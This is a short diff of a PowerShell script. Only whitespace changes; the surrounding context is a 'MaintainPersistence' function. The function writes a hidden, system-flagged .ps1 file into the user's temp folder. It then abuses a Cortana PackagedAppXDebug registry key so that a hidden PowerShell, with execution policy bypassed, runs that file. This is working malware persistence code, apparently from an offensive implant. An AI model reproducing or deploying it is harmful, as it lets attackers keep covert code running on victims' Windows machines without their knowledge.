@@ -25,13 +25,13 @@ $functions = {
     }
   }
   
-  function MaintainPersistence
+  	function MaintainPersistence
 	{
 		while($true)
 		{
 			$modulename = "6D83FC05-F52F-4D0A-9D79-7A14E62DB7E8.ps1"
 			$modulenamepath = "$env:TEMP\$modulename"
-			
+
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
 				Out-File -InputObject "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" -Force $env:TEMP\$modulename
@@ -41,10 +41,10 @@ $functions = {
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes = "Hidden","System"
 			}
-			
+
 			$cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
 			New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C %windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$modulename" -force
-			
+
 			Start-Sleep -Seconds 5
 		}
 	}
